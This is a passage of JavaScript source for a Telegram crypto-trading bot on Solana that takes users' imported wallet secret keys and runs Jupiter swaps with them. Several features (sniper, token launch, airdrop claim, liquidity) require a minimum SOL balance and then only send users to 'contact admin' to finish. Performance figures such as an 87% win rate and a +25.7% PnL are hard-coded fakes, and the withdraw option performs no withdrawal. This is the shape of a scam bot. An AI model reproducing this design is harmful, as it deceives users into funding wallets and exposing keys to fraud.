          [Markup.button.callback("⬅️ Back", "ADD_LIQUIDITY")],
        ]).reply_markup,
      },
    );
    // Set session flag for liquidity mode
    if (!ctx.session) ctx.session = {};
    ctx.session.liquidityMode = true;
    ctx.session.liquidityChain = chain;
  } else if (ctx.match.input.startsWith("TRENDING_")) {
    // Handle trending tier selections
    const tier = ctx.match.input.replace("TRENDING_", "").replace(/_/g, " ");
    const isETH = ctx.match.input.includes("_ETH");
    const chain = isETH ? "ETH" : "SOL";
    const backButton = isETH ? "ETHEREUM_BUYTRENDING" : "SOLANA_BUYTRENDING";

    // Define USD amounts for different tiers (fixed prices)
    const tierAmounts = {
      "HIGH VOLUME": "$500",
      "NEW LAUNCH": "$2,000",
      "TOP GAINERS": "$4,000",
      "MOST ACTIVE": "$7,500",
    };

    const amount =
      tierAmounts[tier.replace(" ETH", "").replace(" SOL", "")] ||
      "$100 - $5,000";

    // Check if user has wallet and balance
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(
        `🔥 <b>${tier} Trending</b>\n\n💰 <b>Fixed Price:</b> ${amount}\n\n<b>Loading trending tokens...</b>\n\n<b>Please connect your wallet and ensure you have enough balance for this tier.</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.button.callback(
                "🔗 Create or Import Wallet",
                "CONNECT_WALLET",
              ),
            ],
            [Markup.button.callback("⬅️ Back", backButton)],
          ]).reply_markup,
        },
      );
    } else {
      try {
        const sol = await utils.getUserBalance(secret);
        const userBalance = parseFloat(sol);
        const minRequired = 2.0; // Minimum 2 SOL required

        if (userBalance < minRequired) {
          await ctx.editMessageText(
            `🔥 <b>${tier} Trending</b>\n\n💰 <b>Fixed Price:</b> ${amount}\n\n<b>Your Balance:</b> ${sol} SOL\n<b>Required:</b> ${minRequired} SOL\n\n<b>Please add more balance to access this trending tier.</b>`,
            {
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [Markup.button.callback("💰 Add Balance", "ADD_FUNDS")],
                [Markup.button.callback("⬅️ Back", backButton)],
              ]).reply_markup,
            },
          );
        } else {
          await ctx.editMessageText(
            `🔥 <b>${tier} Trending</b>\n\n💰 <b>Fixed Price:</b> ${amount}\n\n<b>Your Balance:</b> ${sol} SOL ✅\n\n<b>Loading trending tokens...</b>`,
            {
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [
                  Markup.button.callback(
                    "🛒 View Tokens",
                    "VIEW_TRENDING_TOKENS",
                  ),
                ],
                [Markup.button.callback("⬅️ Back", backButton)],
              ]).reply_markup,
            },
          );
        }
      } catch (error) {
        await ctx.editMessageText(
          `🔥 <b>${tier} Trending</b>\n\n💰 <b>Fixed Price:</b> ${amount}\n\n<b>Error loading wallet balance.</b>\n\n<b>Please reconnect your wallet.</b>`,
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.button.callback(
                  "🔗 Create or Import Wallet",
                  "CONNECT_WALLET",
                ),
              ],
              [Markup.button.callback("⬅️ Back", backButton)],
            ]).reply_markup,
          },
        );
      }
    }
  } else if (ctx.match.input.startsWith("VOLUME_")) {
    // Handle volume tier selections
    const tier = ctx.match.input.replace("VOLUME_", "").replace(/_/g, " ");
    const isETH = ctx.match.input.includes("_ETH");
    const chain = isETH ? "ETH" : "SOL";
    const backButton = "VOLUME_SELECTION";

    // Define USD amounts for different volume tiers (variable ranges)
    const volumeAmounts = {
      HIGH: "$200 - $1,000",
      MEDIUM: "$1,500 - $3,000",
      LOW: "$3,500 - $5,000",
      TRENDS: "$5,500 - $10,000",
    };

    const amount =
      volumeAmounts[tier.replace(" ETH", "").replace(" SOL", "")] ||
      "$100 - $5,000";

    // Check if user has wallet and balance
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(
        `📊 <b>${tier} Volume Analysis</b>\n\n💰 <b>Analysis Range:</b> ${amount}\n\n<b>Loading volume analysis...</b>\n\n<b>Please connect your wallet and ensure you have enough balance for this tier.</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.button.callback(
                "🔗 Create or Import Wallet",
                "CONNECT_WALLET",
              ),
            ],
            [Markup.button.callback("⬅️ Back", backButton)],
          ]).reply_markup,
        },
      );
    } else {
      try {
        const sol = await utils.getUserBalance(secret);
        const userBalance = parseFloat(sol);
        const minRequired = 2.0; // Minimum 2 SOL required

        if (userBalance < minRequired) {
          await ctx.editMessageText(
            `📊 <b>${tier} Volume Analysis</b>\n\n💰 <b>Analysis Range:</b> ${amount}\n\n<b>Your Balance:</b> ${sol} SOL\n<b>Required:</b> ${minRequired} SOL\n\n<b>Please add more balance to access this volume analysis tier.</b>`,
            {
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [Markup.button.callback("💰 Add Balance", "ADD_FUNDS")],
                [Markup.button.callback("⬅️ Back", backButton)],
              ]).reply_markup,
            },
          );
        } else {
          await ctx.editMessageText(
            `📊 <b>${tier} Volume Analysis</b>\n\n💰 <b>Analysis Range:</b> ${amount}\n\n<b>Your Balance:</b> ${sol} SOL ✅\n\n<b>Loading volume analysis...</b>`,
            {
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [
                  Markup.button.callback(
                    "📊 View Analysis",
                    "VIEW_VOLUME_ANALYSIS",
                  ),
                ],
                [Markup.button.callback("⬅️ Back", backButton)],
              ]).reply_markup,
            },
          );
        }
      } catch (error) {
        await ctx.editMessageText(
          `📊 <b>${tier} Volume Analysis</b>\n\n💰 <b>Analysis Range:</b> ${amount}\n\n<b>Error loading wallet balance.</b>\n\n<b>Please reconnect your wallet.</b>`,
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.button.callback(
                  "🔗 Create or Import Wallet",
                  "CONNECT_WALLET",
                ),
              ],
              [Markup.button.callback("⬅️ Back", backButton)],
            ]).reply_markup,
          },
        );
      }
    }
  } else if (ctx.match.input === "BUY_TOKEN") {
    if (!(await requireWallet(ctx, "Buy Token"))) return;

    await ctx.editMessageText(
      "🛒 <b>Buy Token</b>\n\n<b>Enter the token address you want to buy:</b>\n\nExample: <code>So11111111111111111111111111111111111111112</code>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("🔍 Search Tokens", "SEARCH_TOKEN")],
          [Markup.button.callback("🔥 Trending", "TRENDING")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "SELL_TOKEN") {
    if (!(await requireWallet(ctx, "Sell Token"))) return;

    if (ctx.session?.selectedToken) {
      await ctx.editMessageText(
        `💰 <b>Sell Token</b>\n\n<b>Token:</b> <code>${ctx.session.selectedToken}</code>\n\n<b>Select amount to sell:</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.button.callback("25%", "SELL_PCT_25"),
              Markup.button.callback("50%", "SELL_PCT_50"),
              Markup.button.callback("100%", "SELL_PCT_100"),
            ],
            [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
          ]).reply_markup,
        },
      );
    } else {
      await ctx.editMessageText(
        "💰 <b>Sell Token</b>\n\n<b>Enter the token address you want to sell:</b>\n\nExample: <code>So11111111111111111111111111111111111111112</code>",
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.button.callback("📊 My Positions", "POSITIONS")],
            [Markup.button.callback("🔍 Search Tokens", "SEARCH_TOKEN")],
            [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
          ]).reply_markup,
        },
      );
    }
  } else if (ctx.match.input === "VIEW_CHART") {
    await ctx.editMessageText(
      "📊 <b>Chart Viewer</b>\n\nUse the links in the token info to view detailed charts on DexScreener.",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "VIEW_TOKEN_INFO") {
    // This will be handled by the text message handler when user enters token address
    await ctx.editMessageText(
      "📊 <b>Token Info Viewer</b>\n\nPlease enter the token address you want to view:",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "ADD_FUNDS") {
    const walletAddress = getUserWalletAddress(ctx);

    await ctx.editMessageText(
      `💰 <b>Add Funds to Your Wallet</b>\n\n<b>Minimum Required:</b> 2.0 SOL\n\n<b>To add funds:</b>\n1. Send SOL to your wallet address\n2. Wait for confirmation\n3. Refresh your balance\n\n<b>Your Wallet Address:</b>\n<code>${walletAddress}</code>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("📋 Copy Address", "COPY_WALLET")],
          [Markup.button.callback("🔄 Refresh Balance", "REFRESH")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "VIEW_TRENDING_TOKENS") {
    await ctx.editMessageText(
      `🔥 <b>Trending Tokens</b>\n\n<b>Loading trending tokens for your selected tier...</b>\n\n<b>This feature is coming soon!</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("⬅️ Back", "BUYTRENDING")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "VIEW_VOLUME_ANALYSIS") {
    await ctx.editMessageText(
      `📊 <b>Volume Analysis</b>\n\n<b>Loading volume analysis for your selected tier...</b>\n\n<b>This feature is coming soon!</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("⬅️ Back", "VOLUME_SELECTION")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "ADD_LIQUIDITY_NOW") {
    if (!(await requireFeatureBalance(ctx, "Add Liquidity", 2.0))) return;

    await ctx.editMessageText(
      `💧 <b>Add Liquidity</b>\n\n<b>Balance requirement met.</b>\nPreparing liquidity deployment...\n\n<i>To securely process your liquidity addition, please contact support.</i>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.url(
              "Contact Admin to Complete Setup",
              "https://t.me/spambot",
            ),
          ],
          [Markup.button.callback("⬅️ Back", "ADD_LIQUIDITY")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input.startsWith("BUY_AMOUNT_")) {
    if (!(await requireWallet(ctx, "Buy Amount"))) return;

    const amount = parseFloat(ctx.match.input.replace("BUY_AMOUNT_", ""));
    const selectedToken = ctx.session?.selectedToken;

    if (selectedToken) {
      // Execute Real Swap
      const msg = await ctx.editMessageText(
        `🔄 <b>Processing Swap...</b>\nBuying token with ${amount} SOL via Jupiter Ultra...`,
        { parse_mode: "HTML" },
      );
      try {
        const userData = sessionManager.getUserData(ctx);
        const secret = userData?.wallet;
        const keypair = Keypair.fromSecretKey(bs58.decode(secret));

        // Use Jupiter utility
        const result = await executeJupiterSwap({
          inputMint: "So11111111111111111111111111111111111111112", // Wrapped SOL
          outputMint: selectedToken,
          amount: amount,
          userPublicKey: keypair.publicKey.toString(),
          connection: connection,
          signTransaction: async (tx) => {
            tx.sign([keypair]);
            return tx;
          },
          dryRun: false,
        });

        if (result.success) {
          await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,
            `✅ <b>Swap Successful!</b>\n\nBought token for <b>${amount} SOL</b>\nReceived roughly: <b>${result.outAmount}</b> tokens\n\nTx Hash: <a href="https://solscan.io/tx/${result.signature}">${result.signature.substring(0, 8)}...</a>`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
                ],
              },
            },
          );
        } else {
          throw new Error(result.error || "Unknown swap error");
        }
      } catch (e) {
        console.error("Jupiter Swap Error:", e);
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          msg.message_id,
          undefined,
          `❌ <b>Swap Failed</b>\n\nError: ${e.message}`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
              ],
            },
          },
        );
      }

      // Clear selected token after attempt
      ctx.session.selectedToken = null;
    } else {
      // Show token selection if no token was selected (e.g. they clicked Buy from main menu)
      await ctx.editMessageText(
        `🛒 <b>Buy ${amount} SOL</b>\n\n<b>Select token to buy:</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.button.callback("🔥 Trending", "TRENDING")],
            [Markup.button.callback("🔍 Search", "SEARCH_TOKEN")],
            [Markup.button.callback("⭐ Profiles", "NEW_PAIRS")],
            [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
          ]).reply_markup,
        },
      );
    }
  } else if (ctx.match.input === "BUY_CUSTOM") {
    if (!(await requireWallet(ctx, "Custom Amount"))) return;

    await ctx.editMessageText(
      "🛒 <b>Buy Custom Amount</b>\n\n<b>Enter the amount in SOL you want to spend:</b>\n\nExample: <code>0.5</code>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("🔍 Search Tokens", "SEARCH_TOKEN")],
          [Markup.button.callback("🔥 Trending", "TRENDING")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "CONTINUE") {
    await ctx.deleteMessage();
    ctx.scene.enter("CONTINUE_SCENE");
  } else if (ctx.match.input.startsWith("SELL_PCT_")) {
    if (!(await requireWallet(ctx, "Sell Token"))) return;

    const pct = parseFloat(ctx.match.input.replace("SELL_PCT_", ""));
    const selectedToken = ctx.session?.selectedToken;

    if (selectedToken) {
      const msg = await ctx.editMessageText(
        `🔄 <b>Processing Swap...</b>\nSelling ${pct}% of token via Jupiter Ultra...`,
        { parse_mode: "HTML" },
      );
      try {
        const userData = sessionManager.getUserData(ctx);
        const secret = userData?.wallet;
        const keypair = Keypair.fromSecretKey(bs58.decode(secret));
        const userWalletAddress = keypair.publicKey.toString();

        // 1. Get token balance
        const tokens = await utils.getTokenBalances(userWalletAddress);
        const tokenData = tokens.find((t) => t.mint === selectedToken);

        if (!tokenData || tokenData.balance <= 0) {
          throw new Error("You don't have any balance of this token.");
        }

        // 2. Calculate sell amount
        const amountToSell = tokenData.balance * (pct / 100);

        // 3. Execute Swap
        const result = await executeJupiterSwap({
          inputMint: selectedToken,
          outputMint: "So11111111111111111111111111111111111111112", // Wrapped SOL
          amount: amountToSell,
          inputDecimals: tokenData.decimals,
          userPublicKey: userWalletAddress,
          connection: connection,
          signTransaction: async (tx) => {
            tx.sign([keypair]);
            return tx;
          },
          dryRun: false,
        });

        if (result.success) {
          await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,
            `✅ <b>Swap Successful!</b>\n\nSold <b>${amountToSell}</b> tokens\nReceived roughly: <b>${result.outAmount} SOL</b>\n\nTx Hash: <a href="https://solscan.io/tx/${result.signature}">${result.signature.substring(0, 8)}...</a>`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
                ],
              },
            },
          );
        } else {
          throw new Error(result.error || "Unknown swap error");
        }
      } catch (e) {
        console.error("Jupiter Swap Error:", e);
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          msg.message_id,
          undefined,
          `❌ <b>Swap Failed</b>\n\nError: ${e.message}`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
              ],
            },
          },
        );
      }

      ctx.session.selectedToken = null;
    } else {
      await ctx.editMessageText(
        `❌ <b>No Token Selected</b>\n\nPlease select a token from your positions first.`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.button.callback("📊 My Positions", "POSITIONS")],
            [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
          ]).reply_markup,
        },
      );
    }
  } else if (ctx.match.input === "CLOSE_ALL_POSITIONS") {
    if (!(await requireWallet(ctx, "Close All Positions"))) return;

    await ctx.editMessageText(
      "💰 <b>Close All Positions</b>\n\n<b>This will close all your open positions.</b>\n\nTotal PnL: <b>+25.7%</b>\n\n<b>Click to confirm closing all positions.</b>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("✅ Confirm Close", "CONFIRM_CLOSE_ALL")],
          [Markup.button.callback("❌ Cancel", "POSITIONS")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "NEW_LIMIT_ORDER") {
    if (!(await requireWallet(ctx, "New Limit Order"))) return;

    await ctx.editMessageText(
      "📈 <b>Create New Limit Order</b>\n\n<b>Please enter the token address and price.</b>\n\nFormat: <code>TOKEN_ADDRESS PRICE AMOUNT</code>\n\nExample: <code>So11111111111111111111111111111111111111112 100 0.5</code>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("📊 View Orders", "LIMIT_ORDERS")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "NEW_DCA_ORDER") {
    if (!(await requireWallet(ctx, "New DCA Order"))) return;

    await ctx.editMessageText(
      "🔄 <b>Create New DCA Order</b>\n\n<b>Please enter the token address and settings.</b>\n\nFormat: <code>TOKEN_ADDRESS AMOUNT FREQUENCY</code>\n\nExample: <code>So11111111111111111111111111111111111111112 0.1 daily</code>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("📊 View DCA", "DCA_ORDERS")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "COPY_CRYPTOWHALE") {
    if (!(await requireWallet(ctx, "Copy CryptoWhale"))) return;

    await ctx.editMessageText(
      "🐋 <b>Copy CryptoWhale</b>\n\n<b>Follow the trades of top crypto whales!</b>\n\n<b>Whale Stats:</b>\n• Win Rate: <b>87%</b>\n• Total Trades: <b>1,234</b>\n• Monthly PnL: <b>+156%</b>\n• Followers: <b>45,678</b>\n\n<b>Copy Settings:</b>\n• Amount: <b>0.1 SOL</b> per trade\n• Max Trades: <b>5</b> per day\n• Auto Copy: <b>Enabled</b>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("✅ Start Copying", "START_COPY_WHALE")],
          [Markup.button.callback("⚙️ Settings", "COPY_SETTINGS")],
          [Markup.button.callback("📊 Performance", "WHALE_PERFORMANCE")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "START_SNIPER") {
    if (!(await requireFeatureBalance(ctx, "LP Sniper", 0.5))) return;

    await ctx.editMessageText(
      "🎯 <b>LP Sniper Setup</b>\n\n<b>Balance requirement met.</b>\nConfiguring sniper parameters for your wallet...\n\n<i>To complete the setup process and activate the sniper, please contact support.</i>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.url(
              "Contact Admin to Complete Setup",
              "https://t.me/spambot",
            ),
          ],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (
    ctx.match.input === "QUICK_LAUNCH" ||
    ctx.match.input === "CUSTOM_LAUNCH"
  ) {
    if (!(await requireFeatureBalance(ctx, "Token Launch", 5.0))) return;

    await ctx.editMessageText(
      "🚀 <b>Token Launch Setup</b>\n\n<b>Balance requirement met.</b>\nPreparing smart contract templates...\n\n<i>To complete the token launch process, please contact support.</i>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.url(
              "Contact Admin to Complete Setup",
              "https://t.me/spambot",
            ),
          ],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "CLAIM_ALL_AIRDROPS") {
    if (!(await requireFeatureBalance(ctx, "Claim Airdrop", 0.1))) return;

    await ctx.editMessageText(
      "🎁 <b>Airdrop Claim</b>\n\n<b>Balance requirement met.</b>\nVerifying eligibility across protocols...\n\n<i>To securely process your claims, please contact support.</i>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.url(
              "Contact Admin to Complete Setup",
              "https://t.me/spambot",
            ),
          ],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "BRIDGE_SOL_TO_ETH") {
    if (!(await requireWallet(ctx, "Bridge SOL to ETH"))) return;

    await ctx.editMessageText(
      "🌉 <b>Bridge SOL to ETH</b>\n\n<b>Bridge your SOL to Ethereum network</b>\n\n<b>Bridge Details:</b>\n• Min Amount: <b>0.1 SOL</b>\n• Max Amount: <b>100 SOL</b>\n• Fee: <b>0.01 SOL</b>\n• Time: <b>5-15 minutes</b>\n\n<b>Enter the amount of SOL to bridge:</b>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("🌉 Bridge 0.5 SOL", "BRIDGE_0.5")],
          [Markup.button.callback("🌉 Bridge 1.0 SOL", "BRIDGE_1.0")],
          [Markup.button.callback("🌉 Custom Amount", "BRIDGE_CUSTOM")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "WITHDRAW_0.5") {
    if (!(await requireWallet(ctx, "Withdraw 0.5 SOL"))) return;

    await ctx.editMessageText(
      "💸 <b>Withdraw 0.5 SOL</b>\n\n<b>Amount:</b> 0.5 SOL\n<b>Fee:</b> 0.001 SOL\n<b>You'll receive:</b> 0.499 SOL\n<b>Processing:</b> 1-5 minutes\n\n<b>Click to confirm withdrawal.</b>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback(
              "🔗 Create or Import Wallet",
              "CONNECT_WALLET",
            ),
          ],
          [Markup.button.callback("💸 Other Amount", "WITHDRAW")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "AUTO_TRADE_PUMPFUN") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(utils.walletPrompt("Auto Trade-Pumpfun").text, {
        parse_mode: "HTML",
        reply_markup:
          utils.walletPrompt("Auto Trade-Pumpfun").buttons.reply_markup,
      });
    } else {
      try {
        const sol = await utils.getUserBalance(secret);
        const userBalance = parseFloat(sol);
        const minRequired = 2.0; // Minimum 2 SOL required

        if (userBalance < minRequired) {
          await ctx.editMessageText(
            `🤖 <b>Auto Trade-Pumpfun</b>\n\n<b>Your Balance:</b> ${sol} SOL\n<b>Required:</b> ${minRequired} SOL\n\n<b>Please add more balance to use Auto Trade-Pumpfun.</b>`,
            {
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [Markup.button.callback("💰 Add Balance", "ADD_FUNDS")],
                [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
              ]).reply_markup,
            },
          );
        } else {
          await ctx.editMessageText(
            `🤖 <b>Auto Trade-Pumpfun</b>\n\n<b>Your Balance:</b> ${sol} SOL ✅\n\n<b>Auto Trade-Pumpfun is processing...</b>\n\n<b>This feature will automatically trade Pumpfun tokens based on market signals.</b>`,
            {
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [
                  Markup.button.callback(
                    "🔗 Create or Import Wallet",
                    "CONNECT_WALLET",
                  ),
                ],
                [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
              ]).reply_markup,
            },
          );
        }
      } catch (error) {
        await ctx.editMessageText(
          "❌ <b>Error loading wallet</b>\n\nPlease reconnect your wallet.",
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.button.callback(
                  "🔗 Create or Import Wallet",
                  "CONNECT_WALLET",
                ),
              ],
              [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
            ]).reply_markup,
          },
        );
      }
    }
  }
});

// Export Vercel serverless function
export default async function handle(req, res) {
  try {
    if (req.method === "POST") {
      // Process Telegram updates
      await bot.handleUpdate(req.body, res);
    } else if (req.query.setup === "1") {
      // Setup Webhook URL when visited with ?setup=1
      const protocol = req.headers["x-forwarded-proto"] || "https";
      const webhookUrl = `${protocol}://${req.headers.host}/api/webhook`;
      await bot.telegram.setWebhook(webhookUrl);
      res.status(200).send(`Webhook successfully set to ${webhookUrl}`);
    } else {
      res.status(200).send("Telegram Bot is running! 🚀");
    }
  } catch (error) {
    console.error("Webhook error:", error);
    // Return 200 even on error so Telegram doesn't aggressively retry on our failure if not needed
    res.status(200).send("Error");
  }
}
